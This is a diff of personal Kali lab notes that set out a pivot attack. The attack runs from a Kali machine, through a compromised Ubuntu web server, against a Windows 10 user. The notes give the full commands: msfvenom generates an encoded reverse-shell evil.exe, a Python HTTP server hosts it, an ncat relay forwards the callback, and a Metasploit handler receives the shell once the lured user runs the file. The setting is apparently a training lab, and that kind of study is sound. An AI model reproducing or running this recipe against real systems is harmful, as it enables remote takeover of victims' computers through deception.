@@ -6,43 +6,48 @@ Kali-lab test:
     Kali-VM			             UbUntu-VM			   	  Windows10-VM
   My attack VM 			        compromised Web-Srvr		            <TARGET>
  _______________		          _______________		         _______________
-|		|		         | <click-bait>	 |		        |		| 
-|	        |		         |               |                	|               |
-|		|		         |		 |		        |		|  
-|   		|            		 |               |                      |     		|
+|		|		         |  <evil.exe>	 |		        |		| 
+|	       ------------------------ssh_>	        8080* <---10.0.0.30:8080 <-------browser|
+|		|		         |		 |		        |  \ (download)	|  
+|   	       4444<-------------------------------------443<--------------------< evil.exe	|
 |_______________|		         |_______________|		        |_______________|
    10.0.0.20			             10.0.0.30			     	    10.0.0.40                                           
   
-- Using the scenario above (^), we will pretend we've already gained access to the Ubuntu Web server (username/password)
-- We will lure a Windows 10 user (10.0.0.40) to download a malicious payload from the Ubuntu server; which will establish a tunnel from 
-the Windows user THROUGH the Ubuntu server- to our Kali attack machine.
--- we want the traffic to route back throug
-From <TARGET>; view Ubuntu "compromised-web-srvr"; download "evil.exe" and have traffic appear as normal web traffic.
-	--See first diagram below.*
+- Using the scenario above (^), we will simulate access to a grey space compromised web server (Ubuntu)
 
+- We will lure a Windows-10 user (10.0.0.40) to download a malicious payload from the Ubuntu server; which will establish a tunnel from 
+the Windows machine THROUGH the Ubuntu server, connecting to our Kali machine.
+-- we want the traffic to route back through the ubuntu server so it looks like normal traffic to the web server (port 8080).
 
 <------------------------------------------------------------------------------------------------------------------------->
-1) From: kali [msfconsole]--
-	#> msfvenom -p windows/shell/reverse_tcp -a x86 -e x86/shikata_ga_nai -f exe LHOST=10.0.0.30 LPORT=5959 > evil.exe
-2) From: UbUntu [/home/ubuntu/Public] -- Host "evil.exe" on UbUntu-VM (/home/ubuntu/Public)
-	#> python3 -m http.server 8080
-3) Setup SSH Reverse Tunnel from Kali <--> UbUntu to receive the callback
-   From: kali
-   	#> ssh ubuntu@10.0.0.30 -R 5959:0.0.0.0:2960
-	
-* I think this will forward all traffic going to 10.0.0.30:5959 --> to my Kali (10.0.0.20:2960)  *
-	
-Idea #2 use netcat listeners instead of ssh tunnel 
+Step 1:
+  #> (From: kali [msfconsole]--)
+  #> msfvenom -p windows/shell/reverse_tcp -a x86 -e x86/shikata_ga_nai -f exe LHOST=10.0.0.30 LPORT=443 > evil.exe
 
-4) Await connection via Kali-msfconsole-multi/stage/handler
-   From: kali [msfconsole]--
+Step 2:
+  #> From Ubuntu; host the malicious payload
+  #> python3 -m http.server 8080
+
+Step 3:
+  #> From Ubuntu;
+  #> ncat -vkl 8080 -c "ncat 10.0.0.20 4444"
+	
+Step 4:
+  #> From: kali [msfconsole]--
    	#> use exploit/multi/handler
 	#> set payload windows/shell/reverse_tcp
 	#> set LHOST 10.0.0.20
-	#> set LPORT 2960
-	
-5) Click bait and "/exploit" and cross fingers...?
- 	
+	#> set LPORT 4444
+
+Step 5:
+  #> (simulate the windows user; download the .exe at 10.0.0.30:443 (evil.exe)
+  #> run evil.exe
+ 
+ 
+ - This should automatically connect you to the Win-10 client.
+ 
+ 
+
     Kali-VM			             UbUntu-VM			   	  Windows10-VM
   My attack VM 			        compromised Web-Srvr		            <TARGET>
  _______________		          _______________		         _______________
@@ -54,5 +59,3 @@ Idea #2 use netcat listeners instead of ssh tunnel
    10.0.0.20			             10.0.0.30			     	    10.0.0.40                                           
 
 
-===============================================================================================================================
-===============================================================================================================================
